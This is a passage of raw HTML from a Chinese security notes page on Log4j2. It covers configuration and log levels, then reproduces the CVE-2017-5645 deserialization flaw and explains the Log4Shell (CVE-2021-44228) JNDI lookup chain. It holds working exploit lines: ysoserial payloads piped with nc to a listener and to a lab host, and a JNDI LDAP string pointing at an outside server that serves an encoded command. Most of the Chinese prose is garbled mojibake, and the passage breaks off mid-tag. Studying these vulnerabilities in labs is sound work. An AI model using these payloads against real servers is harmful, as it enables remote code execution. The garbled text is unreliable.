    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- nameå±æ€§ä¸ºé¡¹ç›®åŒ…åæˆ–è€…ç±»å --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.jourwon<span class="token punctuation">&quot;</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>debug<span class="token punctuation">&quot;</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>error<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">&gt;</span></span>
    
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">&gt;</span></span>


</code></pre><ul><li><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒLog4j2åœ¨classpathä¸‹æŸ¥æ‰¾åä¸ºlog4j2.xmlçš„é…ç½®æ–‡ä»¶ã€‚</p></li><li><p>ä¹Ÿå¯ä»¥ä½¿ç”¨Javaå¯åŠ¨å‘½ä»¤æŒ‡å®šé…ç½®æ–‡ä»¶çš„å…¨è·¯å¾„ã€‚-Dlog4j.configurationFile=opt/demo/log4j2.xml</p></li><li><p>è¿˜å¯ä»¥ä½¿ç”¨Javaä»£ç æŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„ï¼Œä¾‹å¦‚</p></li></ul><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">LoggerContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token class-name">LoggerContext</span> loggerContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LoggerContext</span><span class="token punctuation">)</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;opt/demo/log4j2.xml&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    loggerContext<span class="token punctuation">.</span><span class="token function">setConfigLocation</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><ul><li>Webå·¥ç¨‹web.xmlé…ç½®ç›‘å¬åŠåŠ è½½ï¼š</li></ul><pre><code class="language-xml"><span class="token comment">&lt;!-- Webå·¥ç¨‹æ–¹å¼åŠ è½½ --&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>log4jConfiguration<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>classpath:log4j2.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">&gt;</span></span>  

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j.web.Log4jServletContextListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">&gt;</span></span> 
</code></pre><p>Log4j2ä¸­æ—¥å¿—æœ‰å…­ä¸ªçº§åˆ«ï¼ˆlevelï¼‰ï¼š</p><ul><li>traceï¼šè¿½è¸ªï¼Œæ˜¯æœ€ä½çš„æ—¥å¿—çº§åˆ«ï¼Œç›¸å½“äºè¿½è¸ªç¨‹åºçš„æ‰§è¡Œï¼Œä¸€èˆ¬ä¸æ€ä¹ˆä½¿ç”¨</li><li>debugï¼šè°ƒè¯•ï¼Œä¸€èˆ¬åœ¨å¼€å‘ä¸­ï¼Œéƒ½å°†å…¶è®¾ç½®ä¸ºæœ€ä½çš„æ—¥å¿—çº§åˆ«</li><li>infoï¼šä¿¡æ¯ï¼Œè¾“å‡ºé‡è¦çš„ä¿¡æ¯ï¼Œä½¿ç”¨è¾ƒå¤š</li><li>warnï¼šè­¦å‘Šï¼Œæœ‰äº›æ—¶å€™,è™½ç„¶ç¨‹åºä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦å‘Šè¯‰ç¨‹åºå‘˜çš„</li><li>errorï¼šé”™è¯¯ï¼Œè¿™ä¸ªåœ¨å¼€å‘ä¸­ä¹ŸæŒºå¸¸ç”¨çš„</li><li>fatalï¼šä¸¥é‡é”™è¯¯ï¼Œè¿™ä¸ªä¸€æ—¦å‘ç”Ÿï¼Œç¨‹åºåŸºæœ¬ä¸Šä¹Ÿè¦åœæ­¢äº† å½“æ—¥å¿—çº§åˆ«è®¾ç½®ä¸ºæŸä¸ªå€¼çš„æ—¶å€™ï¼Œä½äºå®ƒçš„æ—¥å¿—ä¿¡æ¯å°†ä¸ä¼šè¢«è®°å½•ï¼Œåªæœ‰é«˜äºè®¾ç½®çš„çº§åˆ«çš„ä¿¡æ¯ä¼šè¢«è®°å½•ã€‚</li></ul><h2 id="_2-éƒ¨åˆ†å†å²æ¼æ´æ¼”ç¤º" tabindex="-1"><a class="header-anchor" href="#_2-éƒ¨åˆ†å†å²æ¼æ´æ¼”ç¤º"><span>2. éƒ¨åˆ†å†å²æ¼æ´æ¼”ç¤º</span></a></h2><h3 id="_2-1-log4j2-ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´-cve-2017-5645" tabindex="-1"><a class="header-anchor" href="#_2-1-log4j2-ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´-cve-2017-5645"><span>2.1 Log4j2 ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰</span></a></h3><p>ï¼ˆ1ï¼‰æ¼æ´ä»‹ç»</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªç‰¹åˆ«åˆ¶ä½œçš„äºŒè¿›åˆ¶payloadï¼Œåœ¨ç»„ä»¶å°†å­—èŠ‚ååºåˆ—åŒ–ä¸ºå¯¹è±¡æ—¶ï¼Œè§¦å‘å¹¶æ‰§è¡Œæ„é€ çš„payloadä»£ç ã€‚</p><p>è¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºåœ¨å¤„ç†ObjectInputStreamæ—¶ï¼Œæ¥æ”¶å™¨å¯¹äºä¸å¯é æ¥æºçš„inputæ²¡æœ‰è¿‡æ»¤ã€‚å¯ä»¥é€šè¿‡ç»™TcpSocketServerå’ŒUdpSocketServeræ·»åŠ å¯é…ç½®çš„è¿‡æ»¤åŠŸèƒ½ä»¥åŠä¸€äº›ç›¸å…³è®¾ç½®ï¼Œå¯ä»¥æœ‰æ•ˆçš„è§£å†³è¯¥æ¼æ´ã€‚ç›®å‰Log4jå®˜æ–¹å·²ç»å‘å¸ƒæ–°ç‰ˆæœ¬ä¿®å¤äº†è¯¥æ¼æ´ã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼šLog4j&lt;2.8.2</p><p>ï¼ˆ2ï¼‰ æ¼æ´åŸç†</p><p>Demoç¯å¢ƒï¼ˆä¸ºäº†æ¼æ´å¤ç°æˆåŠŸï¼Œæ·»åŠ ä¸€æ¡ <strong>commons-collections</strong> çš„ <strong>Gadget</strong>ï¼‰</p><pre><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>ç„¶åå†™ä¸€ä¸ªmainå‡½æ•°ï¼Œåœ¨8888ç«¯å£èµ·ä¸€ä¸ªæ¥æ”¶æ•°æ®çš„SocketServer</p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStreamLogEventBridge</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">TcpSocketServer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jSocketServer</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">TcpSocketServer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">&gt;</span></span> myServer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            myServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TcpSocketServer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStreamLogEventBridge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        myServer<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p>åªéœ€è¦å°†ååºåˆ—åŒ–åçš„payloadå‘é€ç»™è¿™ä¸ªç«¯å£ï¼Œ</p><figure><img src="/DailyNotes/assets/image-20230713154838259-2eF9qCix.png" alt="image-20230713154838259" tabindex="0" loading="lazy"><figcaption>image-20230713154838259</figcaption></figure><p>ç¬¬ä¸€ä¸ªæ–­ç‚¹å¤„ï¼Œç­‰å¾…æ¥æ”¶socketæ•°æ®ï¼›</p><p>ç¬¬äºŒä¸ªæ–­ç‚¹å¤„ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®è½¬æ¢æˆ<strong>ObjectInputStream</strong> å¯¹è±¡æ•°æ®ï¼›</p><p>æœ€ç»ˆåœ¨ <code>handler.start()</code> ä¸­è°ƒç”¨<strong>SocketHandler</strong> ç±»çš„ <strong>run</strong> æ–¹æ³•ã€‚</p><figure><img src="/DailyNotes/assets/image-20230713155351255-DV_2CxhN.png" alt="image-20230713155351255" tabindex="0" loading="lazy"><figcaption>image-20230713155351255</figcaption></figure><p>åœ¨ <strong>SocketHandler</strong> ç±»çš„ <strong>run</strong> æ–¹æ³•ä¸­ï¼Œ <strong>ObjectInputStream</strong>å¯¹è±¡æ•°æ®è¢«ä¼ å…¥äº† <strong>ObjectInputStreamLogEventBridge</strong> ç±»çš„ <strong>logEvents</strong>æ–¹æ³•ï¼Œè€Œååºåˆ—åŒ–å°±å‘ç”Ÿåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ã€‚</p><figure><img src="/DailyNotes/assets/image-20230713155701764-D_GeRWwV.png" alt="image-20230713155701764" tabindex="0" loading="lazy"><figcaption>image-20230713155701764</figcaption></figure><p>å°±æ˜¯è¿™æ ·ã€‚</p><p>ï¼ˆ3ï¼‰æ¼æ´åˆ©ç”¨</p><blockquote><p>æœ¬åœ°ç¯å¢ƒæ¼æ´åˆ©ç”¨ï¼š</p></blockquote><pre><code>java -jar ysoserial-all.jar CommonsCollections3 calc &gt;&gt; payload.bin
cat payload.bin | nc 127.0.0.1 8888
</code></pre><blockquote><p>vulhubé¶åœºç¯å¢ƒï¼Œä½¿ç”¨å·¥å…·ysoserial</p></blockquote><pre><code>java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/success&quot; | nc 192.168.1.189 4712

</code></pre><figure><img src="/DailyNotes/assets/image-20230712163753249-BNj7XFle.png" alt="image-20230712163753249" tabindex="0" loading="lazy"><figcaption>image-20230712163753249</figcaption></figure><figure><img src="/DailyNotes/assets/image-20230712163807743-BDAQtr7f.png" alt="image-20230712163807743" tabindex="0" loading="lazy"><figcaption>image-20230712163807743</figcaption></figure><h3 id="_2-2-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-44228" tabindex="-1"><a class="header-anchor" href="#_2-2-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-44228"><span>2.2 Log4j2 JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-44228ï¼‰</span></a></h3><p>ï¼ˆ1ï¼‰æ¼æ´ä»‹ç»</p><p>æ¼æ´å½±å“ç‰ˆæœ¬ä¸º2.0~2.14.1ã€‚</p><p>2021 å¹´ 11 æœˆ 24 æ—¥ï¼Œé˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿå‘ Apache å®˜æ–¹æŠ¥å‘Šäº† Apache Log4j2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåœ¨ 12 æœˆ 9 æ—¥è¢«å›½å¤–æœ‰äººå…¬å¼€ POCï¼Œä»è€Œå¯¼è‡´äº†ä¸€æ³¢å®‰å…¨ä»ä¸šäººå‘˜çš„ç–¯ç‹‚è¿åŠ¨ï¼Œç”²æ–¹å®‰å…¨ä»ä¸šè€…åŠ ç­åŠ ç‚¹ä¿®å¤æ¼æ´ï¼›ç™½å¸½å­ä»¬ç–¯ç‹‚æ‰«ææ¼æ´å¹¶æäº¤ SRCï¼Œä¸€åº¦å¯¼è‡´ä¸€äº› SRC å‘å¸ƒå…¬å‘Šæš‚åœæ¥æ”¶ç›¸å…³æ¼æ´ï¼›è€Œé»‘ç°äº§ä»¬å·²ç»åœ¨è‡ªå·±çš„æŒ–çŸ¿å‹’ç´¢æ­¦å™¨åº“ä¸Šå¢åŠ äº†è¯¥æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆç–¯ç‹‚ï¼Ÿ</p><p>æ¼æ´è§¦å‘åŠå…¶ç®€å•ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ¼æ´åˆ©ç”¨æ— éœ€ç‰¹æ®Šé…ç½®</p><pre><code>æ¼æ´åˆšçˆ†å‡ºæ—¶å—å½±å“çš„ç»„ä»¶ï¼š
Spring-Boot-strater-log4j2
Apache Struts2
Apache Solr
Apache Flink
Apache Druid
ElasticSearch
Flume
Dubbo
Redis
Logstash
Kafka
vmvare
</code></pre><p>æ­¤æ¼æ´å½±å“å¹¿æ³›ï¼Œå¼€æºç»„ä»¶ä¸­æœ‰è¿‘ä¸¤ä¸‡é¡¹ç›®ä½¿ç”¨è¯¥å­˜åœ¨æ¼æ´çš„æ¨¡å—ï¼Œç»å¯¹æ˜¯ç›®å‰ä¸ºæ­¢å½±å“æœ€ä¸ºå¹¿æ³›çš„æ¼æ´ï¼Œå ªæ¯”ä¹‹å‰å‡ºç°çš„ heartbleedï¼ˆå¿ƒè„æ»´è¡€ï¼‰æ¼æ´ã€‚æ¯”å¦‚ vmvare çš„å…¬å‘Šï¼šhttps://www.vmware.com/security/advisories/VMSA-2021-0028.html</p><p>è‡³æ¼æ´çˆ†å‘å¼€å§‹ï¼Œä¸ºäº†ä½“ç°è¯¥æ¼æ´çš„å½±å“ï¼Œç”šè‡³æœ‰äº†æ¼æ´æ‰“åœ°çƒçš„è¶£å›¾ï¼Œè¯¦æƒ…å‚è€ƒã€Š<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247496216&amp;idx=1&amp;sn=2c85e1ad985e8a37c5ec2b7a5bded7cd&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">æ ¸å¼¹çº§æ¼æ´å…¬å¼€ï¼Œæ˜¨æ™šä½ ç¡ç€äº†ä¹ˆï¼Ÿ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ã€‹ï¼Œé™¤äº†æ–‡ä¸­çš„è¿˜æœ‰å…¥ä¾µæ±½è½¦ã€å€Ÿç”¨ WIFI åç§°é’“é±¼çš„ï¼Œä»çº¿ä¸Šåˆ°çº¿ä¸‹å¹¿æ³›åº”ç”¨ï¼š</p><p>å¤§é‡ç½‘ç«™å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚ç™¾åº¦ï¼š</p><figure><img src="/DailyNotes/assets/640-DXvVkOKv.png" alt="640" tabindex="0" loading="lazy"><figcaption>640</figcaption></figure><p>ICloudï¼š</p><figure><img src="/DailyNotes/assets/icloud-D82ni1bO.png" alt="icloud" tabindex="0" loading="lazy"><figcaption>icloud</figcaption></figure><figure><img src="/DailyNotes/assets/jingdong-BWeOnrcU.png" alt="jingdong" tabindex="0" loading="lazy"><figcaption>jingdong</figcaption></figure><p>ï¼ˆ2ï¼‰æ¼æ´åŸç†</p><p>å…³äºlog4j2çš„lookupåŠŸèƒ½</p><p>https://logging.apache.org/log4j/2.x/manual/lookups.html</p><p>æ—¥å¿—åœ¨æ‰“å°æ—¶å½“é‡åˆ° <code>${</code> åï¼ŒInterpolator ç±»ä»¥ <code>:</code> å·ä½œä¸ºåˆ†å‰²ï¼Œå°†è¡¨è¾¾å¼å†…å®¹åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œå‰é¢éƒ¨åˆ†ä½œä¸º prefixï¼Œåé¢éƒ¨åˆ†ä½œä¸º keyã€‚ç„¶åé€šè¿‡ prefix å»æ‰¾å¯¹åº”çš„ lookupï¼Œé€šè¿‡å¯¹åº”çš„ lookup å®ä¾‹è°ƒç”¨ lookup æ–¹æ³•ï¼Œæœ€åå°† key ä½œä¸ºå‚æ•°å¸¦å…¥æ‰§è¡Œã€‚</p><p>è°ƒç”¨å †æ ˆå¦‚ä¸‹ï¼š</p><figure><img src="/DailyNotes/assets/image-20230714093554406-DB4g-JCh.png" alt="image-20230714093554406" tabindex="0" loading="lazy"><figcaption>image-20230714093554406</figcaption></figure><p>å…³é”®ç‚¹ï¼š</p><pre><code>LOGGER.error
  ......
    MessagePatternConverter.format
      ....
        StrSubstitutor.resolveVariable
          Interpolator.lookup
            JndiLookup.lookup
              JndiManager.lookup
                InitialContext.lookup

</code></pre><ul><li><strong>MessagePatternConverter.format</strong></li></ul><p>pocä»£ç ä¸­çš„LOGGER.error()æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ°MessagePatternConverter.format()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹æ—¥å¿—å†…å®¹è¿›è¡Œè§£æå’Œæ ¼å¼åŒ–ï¼Œå¹¶è¿”å›æœ€ç»ˆæ ¼å¼åŒ–åçš„æ—¥å¿—å†…å®¹ã€‚å½“ç¢°åˆ°æ—¥å¿—å†…å®¹ä¸­åŒ…å«<code>${</code>å­ä¸²æ—¶ï¼Œè°ƒç”¨StrSubstitutorè¿›è¡Œè¿›ä¸€æ­¥è§£æã€‚</p><figure><img src="/DailyNotes/assets/image-20230714093902104-D9bDv13J.png" alt="image-20230714093902104" tabindex="0" loading="lazy"><figcaption>image-20230714093902104</figcaption></figure><ul><li><strong>StrSubstitutor.resolveVariable</strong></li></ul><p>StrSubstitutorå°†<code>${</code>å’Œ<code>}</code>ä¹‹é—´çš„å†…å®¹æå–å‡ºæ¥ï¼Œè°ƒç”¨å¹¶ä¼ é€’ç»™Interpolator.lookup()æ–¹æ³•ï¼Œå®ç°LookupåŠŸèƒ½ã€‚</p><figure><img src="/DailyNotes/assets/image-20230714094046558-D3hZpPB7.png" alt="image-20230714094046558" tabindex="0" loading="lazy"><figcaption>image-20230714094046558</figcaption></figure><ul><li><strong>Interpolator.lookup</strong></li></ul><p>Interpolatorå®é™…æ˜¯ä¸€ä¸ªå®ç°LookupåŠŸèƒ½çš„ä»£ç†ç±»ï¼Œè¯¥ç±»åœ¨æˆå‘˜å˜é‡strLookupMapä¸­ä¿å­˜ç€å„ç±»LookupåŠŸèƒ½çš„çœŸæ­£å®ç°ç±»ã€‚Interpolatorå¯¹ ä¸Šä¸€æ­¥æå–å‡ºçš„å†…å®¹è§£æåï¼Œä»strLookupMapè·å¾—LookupåŠŸèƒ½å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å®ç°ç±»çš„lookup()æ–¹æ³•ã€‚</p><p>ä¾‹å¦‚å¯¹pocä¾‹å­ä¸­çš„jndi:ldap://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==è§£æåå¾—åˆ°jndiçš„LookupåŠŸèƒ½å®ç°ç±»ä¸ºJndiLookupï¼Œå¹¶è°ƒç”¨JndiLookup.lookup()æ–¹æ³•ã€‚ <img src="/DailyNotes/assets/image-20230714094607300-BsSJYCrp.png" alt="image-20230714094607300" loading="lazy"></p><ul><li><strong>JndiLookup.lookup</strong></li></ul><p><code>JndiLookup.lookup()</code>æ–¹æ³•è°ƒç”¨<code>JndiManager.lookup()</code>æ–¹æ³•</p><figure><img src="/DailyNotes/assets/image-20230714095658156-D6BQLIca.png" alt="image-20230714095658156" tabindex="0" loading="lazy"><figcaption>image-20230714095658156</figcaption></figure><p>è·å–JNDIå¯¹è±¡åï¼Œè°ƒç”¨è¯¥å¯¹è±¡ä¸Šçš„<code>toString()</code>æ–¹æ³•ï¼Œæœ€ç»ˆè¿”å›è¯¥å­—ç¬¦ä¸²ã€‚</p><figure><img src="/DailyNotes/assets/image-20230714094925609-CpoX2YzK.png" alt="image-20230714094925609" tabindex="0" 